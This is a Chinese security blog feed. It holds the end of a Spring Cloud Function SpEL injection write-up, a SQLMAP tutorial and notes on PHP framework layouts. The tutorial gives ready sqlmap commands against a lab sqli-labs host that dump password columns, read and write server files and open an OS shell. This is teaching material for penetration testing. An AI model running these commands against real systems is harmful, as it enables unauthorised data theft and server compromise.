<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401151108010.png" class title="image-20220401151108010">

<p>在官方最新的修补文件中，可以看到新增了<code>headerEvalContext</code>对象，该对象所对应的是使用了仅支持最基本功能的<code>SimpleEvaluationContext</code>。且在调用<code>functionFromExpression</code>方法的时候新增了一个<code>isViaHead</code>布尔类型的参数，用来判断该值是否是取自消息的<code>header</code>中，如果是则使用<code>headerEvalContext</code>对象来解析SpEL表达式。</p>
<img src="/2022/03/04/Spring-Cloud-Function-SpEl%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20220401151238119.png" class title="image-20220401151238119">

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.xttblog.com/?p=5329">Spring框架被爆RCE 0day高危漏洞！附修复教程！ – 业余草 (xttblog.com)</a></p>
<p><a href="https://blog.csdn.net/qq_44122254/article/details/123815641">(67条消息) Spring-Cloud-Function SpEL RCE(VULFOCUS靶场)_坚果雨的博客-CSDN博客</a></p>
<p>[<a href="https://forum.ywhack.com/shell.php">~]#棱角 ::Edge.Forum* (ywhack.com)</a></p>
<p>[漏洞复现-Spring Cloud Function SpEL表达式注入 | Hyyrent blog (pizz33.github.io)](<a href="https://pizz33.github.io/2022/03/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Spring">https://pizz33.github.io/2022/03/27/漏洞复现-Spring</a> Cloud Function SpEL表达式注入&#x2F;)</p>
<p><a href="https://www.anquanke.com/post/id/271167">SpringCloud Function SpEL漏洞环境搭建+漏洞复现 - 安全客，安全资讯平台 (anquanke.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>开发框架漏洞</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -Spring框架 -远程代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMAP用法</title>
    <url>/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="SQLMAP用法"><a href="#SQLMAP用法" class="headerlink" title="SQLMAP用法"></a>SQLMAP用法</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>sqlmap是一款基于python编写的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>工具，在sql检测和利用方面功能强大，支持多种数据库</p>
<h2 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                         显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">​                                          0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">​                                          1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">​                                          2：显示debug消息</span><br><span class="line"></span><br><span class="line">​                                          3：显示注入payload</span><br><span class="line"></span><br><span class="line">​                                          4：显示http请求</span><br><span class="line"></span><br><span class="line">​                                          5：显示http响应头·</span><br><span class="line"></span><br><span class="line">​                                          6：显示http响应内容</span><br></pre></td></tr></table></figure>

<h3 id="Target："><a href="#Target：" class="headerlink" title="Target："></a>Target：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br></pre></td></tr></table></figure>

<h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                            POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure>

<p>​           </p>
<h3 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br></pre></td></tr></table></figure>



<h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br></pre></td></tr></table></figure>



<h3 id="Detectiong"><a href="#Detectiong" class="headerlink" title="Detectiong"></a>Detectiong</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br></pre></td></tr></table></figure>



<h3 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br></pre></td></tr></table></figure>



<h3 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br></pre></td></tr></table></figure>



<h3 id="Emuneration"><a href="#Emuneration" class="headerlink" title="Emuneration"></a>Emuneration</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br></pre></td></tr></table></figure>



<h3 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br></pre></td></tr></table></figure>



<h3 id="File-system-access"><a href="#File-system-access" class="headerlink" title="File system access"></a>File system access</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br></pre></td></tr></table></figure>



<h3 id="General"><a href="#General" class="headerlink" title="General"></a>General</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br></pre></td></tr></table></figure>



<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>–technique&#x3D;     （默认全部使用）</p>
<p>B       基于布尔的盲注</p>
<p>T       基于时间的盲注</p>
<p>E      基于报错的注入</p>
<p>U      基于UNION查询注入</p>
<p>S      基于多语句查询注入</p>
<h3 id="获取目标"><a href="#获取目标" class="headerlink" title="获取目标"></a>获取目标</h3><p><strong>1.指定目标url</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>2.从文件中获取多个url</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -m 1.txt</span><br></pre></td></tr></table></figure>

<p><strong>3.从文件中加载HTTP请求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>

<p><strong>4.利用google获取目标</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p><strong>5.从burp日志中获取目标</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -l    burp.txt</span><br></pre></td></tr></table></figure>



<h3 id="实例演示-注入检测"><a href="#实例演示-注入检测" class="headerlink" title="实例演示-注入检测"></a>实例演示-注入检测</h3><p><strong>1.GET参数注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>2.POST参数注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;  --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）</strong>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 2</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定cookie，这样就可以检测cookie。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183719226.png" class title="image-20220221183719226">

<p><strong>4.user-agent注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183751119.png" class title="image-20220221183751119">





<p><strong>5.referer注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 3</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定referer，这样就可以检测referer。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221183847549.png" class title="image-20220221183847549">



<p><strong>6.host注入</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --level 5</span><br></pre></td></tr></table></figure>

<p>如图，用 * 号指定host，这样就可以检测host。</p>
<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184003961.png" class title="image-20220221184003961">



<h3 id="实例演示-获取数据库信息"><a href="#实例演示-获取数据库信息" class="headerlink" title="实例演示-获取数据库信息"></a>实例演示-获取数据库信息</h3><p><strong>1.查看数据库</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --dbs  --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184417117.png" class title="image-20220221184417117">



<p><strong>2.查看数据库里面的表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --tables --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184338043.png" class title="image-20220221184338043">



<p><strong>3.查看数据库表里面的列</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --T users --columns   --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184320282.png" class title="image-20220221184320282">



<p><strong>4.查看数据库列里面的具体的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot; --D security --T users -C password     --dump  --batch</span><br></pre></td></tr></table></figure>

<img src="/2022/03/10/SQLMAP%E7%94%A8%E6%B3%95/image-20220221184302447.png" class title="image-20220221184302447">



<h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p>使用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.MySQL数据库版本小于5.0，没有information——schema表。</span><br><span class="line"></span><br><span class="line">2.Microssoft Access数据库。</span><br><span class="line"></span><br><span class="line">3.当前用户没有权限读取系统中保存的数据。</span><br></pre></td></tr></table></figure>

<p><strong>暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</strong></p>
<p><strong>1.暴力破解表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security --common-tables --batch</span><br></pre></td></tr></table></figure>



<p><strong>2.暴力破解列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  -D security -T users --common-columns --batch</span><br></pre></td></tr></table></figure>



<h3 id="实例演示-读取文件-x2F-上传文件"><a href="#实例演示-读取文件-x2F-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-read &quot;C:/post.txt&quot;</span><br></pre></td></tr></table></figure>



<p><strong>2.写入文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-write &quot;/root/1.txt&quot;</span><br><span class="line"></span><br><span class="line"> --file-dest &quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></pre></td></tr></table></figure>



<h3 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>-SQL注入 -工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP框架指纹识别</title>
    <url>/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<h1 id="PHP框架指纹识别"><a href="#PHP框架指纹识别" class="headerlink" title="PHP框架指纹识别"></a>PHP框架指纹识别</h1><blockquote>
<p>在代码审计项目中，首先需要判断审计代码使用的框架，帮助我们快速定位有用的函数集，筛选不需要看的代码。目前比较主流的设计模式是MVC，即多层模型（M）、视图（V）、控制器（C），在此不多赘述，php的主流框架几乎都使用了MVC设计模式。PHP底下的开发框架目前见的比较多的有Laravel，ThinkPHP，yii等。</p>
</blockquote>
<h2 id="ThinkPHP框架"><a href="#ThinkPHP框架" class="headerlink" title="ThinkPHP框架"></a>ThinkPHP框架</h2><blockquote>
<p>ThinkPHP的话需要区分版本的区别，ThinkPHP3和ThinkPHP5的目录结构。</p>
</blockquote>
<h3 id="ThinkPHP3"><a href="#ThinkPHP3" class="headerlink" title="ThinkPHP3"></a>ThinkPHP3</h3><p>现在基于ThinkPHP3的系统很少，还是值得了解的</p>
<h4 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h4><p><strong>Application目录</strong></p>
<p>用来存放项目中的一些重要函数集，默认是空的，但第一次访问后入口文件会自动生成</p>
<p><strong>Public目录</strong></p>
<p>是公共文件夹，供用户访问的，重要的函数集不能放在文件夹下</p>
<p><strong>ThinkPHP目录</strong></p>
<p>框架结构如下:</p>
<img src="/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/image-20220322181729704.png" class title="image-20220322181729704">

<h3 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a><strong>ThinkPHP5</strong></h3><blockquote>
<p>TP5和TP3实际上差距有点大。其中在public文件下有个route.php文件，它的作用是用于php自带webserver支持，可用于快速测试，启动命令：php -S localhost:8888 router.php。而它的相关网站功能目录也需要从根目录下的index.php入手。</p>
</blockquote>
<p>默认结构如下：</p>
<img src="/2022/03/17/PHP%E6%A1%86%E6%9E%B6%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/image-20220322182130381.png" class title="image-20220322182130381">

<h3 id="ThinkAdmin"><a href="#ThinkAdmin" class="headerlink" title="ThinkAdmin"></a>ThinkAdmin</h3><p>基于ThinkPHP6版本的ThinkAdmin</p>
<h4 id="根目录-1"><a href="#根目录-1" class="headerlink" title="根目录"></a>根目录</h4><p><strong>App目录</strong></p>
<p>也就是Application目录，下面会存在多个文件夹，每个文件夹代表一个应用。比如admin一般来说是后台的服务，wechat为微信应用服务，并且每个应用下面都有Controller(控制器)、Module(模型)、View(视图)、Route(路由)等</p>
<p><strong>Config目录</strong></p>
<p>放置一些配置文件</p>
<p><strong>public目录</strong></p>
<p>公共文件夹，供用户访问</p>
<p><strong>vendor目录</strong></p>
<p>存放第三方类库</p>
<h2 id="Laravel框架"><a href="#Laravel框架" class="headerlink" title="Laravel框架"></a>Laravel框架</h2><p>Laravel 应用默认的目录结构试图为不管是大型应用还是小型应用提供一个好的起点，当然，你可以自己按照喜好重新组织应用目录结构，Laravel 对类在何处被加载没有任何限制——只要 Composer 可以自动载入它们即可。</p>
<p><strong>Models****目录在哪里？</strong></p>
<p>许多初学者都会困惑Laravel为什么没有<code>models</code>目录，我可以负责任的告诉大家，这是故意的。因为<code>models</code>这个词对不同人而言有不同的含义，容易造成歧义，有些开发者认为应用的模型指的是业务逻辑，另外一些人则认为模型指的是与关联数据库的交互。</p>
<p>正是因为这个原因，我们默认将Eloquent的模型直接放置到<code>app</code>目录下，从而允许开发者自行选择放置的位置。</p>
<h3 id="根目录-2"><a href="#根目录-2" class="headerlink" title="根目录"></a><strong>根目录</strong></h3><p><strong>App目录</strong></p>
<p><code>app</code>目录包含了应用的核心代码，此外你为应用编写的代码绝大多数也会放到这里；</p>
<p><strong>Bootstrap目录</strong></p>
<p><code>bootstrap</code>目录包含了少许文件，用于框架的启动和自动载入配置，还有一个<code>cache</code>文件夹用于包含框架为提升性能所生成的文件，如路由和服务缓存文件；</p>
<p><strong>Config目录</strong></p>
<p><code>config</code>目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉所有配置项；</p>
<p><strong>Database目录</strong></p>
<p><code>database</code>目录包含了数据迁移及填充文件，如果你喜欢的话还可以将其作为 SQLite 数据库存放目录；</p>
<p><strong>Public目录</strong></p>
<p><code>public</code>目录包含了入口文件<code>index.php</code>和前端资源文件（图片、JavaScript、CSS等）；</p>
<p><strong>Resources目录</strong></p>
<p><code>resources</code>目录包含了视图文件及原生资源文件（LESS、SASS、CoffeeScript），以及本地化文件；</p>
<p><strong>Routes目录</strong></p>
<p><code>routes</code> 目录包含了应用的所有路由定义。Laravel默认提供了三个路由文件：<code>web.php</code>、<code>api.php</code>和<code>console.php</code>。</p>
<p><code>web.php</code>文件包含的路由都会应用web中间件组，具备Session、CSRF防护以及Cookie加密功能，如果应用无需提供无状态的、RESTful风格的API，所有路由都会定义在<code>web.php</code>文件。</p>
<p><code>api.php</code> 文件包含的路由应用了<code>api</code>中间件组，具备频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过token进行认证并且不能访问Session状态。</p>
<p><code>console.php</code> 文件用于定义所有基于闭包的控制台命令，每个闭包都被绑定到一个控制台命令并且允许与命令行IO方法进行交互，尽管这个文件并不定义HTTP路由，但是它定义了基于控制台的应用入口（路由）。</p>
<p><strong>Storage目录</strong></p>
<p><code>storage</code>目录包含了编译过的Blade模板、基于文件的session、文件缓存，以及其它由框架生成的文件，该目录被细分为成<code>app</code>、<code>framework</code>和<code>logs</code>子母录，<code>app</code>目录用于存放应用要使用的文件，<code>framework</code>目录用于存放框架生成的文件和缓存，最后，<code>logs</code>目录包含应用的日志文件；</p>
<p><code>storage/app/public</code> 目录用于存储用户生成的文件，比如可以被公开访问的用户头像，要达到被访问的目的，你还需要在<code>public</code>目录下生成一个软连接 <code>storage</code> 指向这个目录。你可以通过 <code>php artisan storage:link</code> 命令生成这个软链接。</p>
<p><strong>Tests目录</strong></p>
<p><code>tests</code>目录包含自动化测试，其中已经提供了一个开箱即用的<a href="https://phpunit.de/">PHPUnit</a>示例；每一个测试类都要以 Test 开头，你可以通过 <code>phpunit</code> 或 <code>php vendor/bin/phpunit</code> 命令来运行测试。</p>
<p><strong>Vendor目录</strong></p>
<p><code>vendor</code>目录包含<a href="https://getcomposer.org/">Composer</a>依赖。</p>
<h3 id="App目录"><a href="#App目录" class="headerlink" title="App目录"></a><strong>App目录</strong></h3><p>应用的核心代码位于<code>app</code>目录下，默认情况下，该目录位于命名空间 App 下，  并且被 Composer 通过 <a href="http://www.php-fig.org/psr/psr-4/">PSR-4自动载入标准</a> 自动加载。</p>
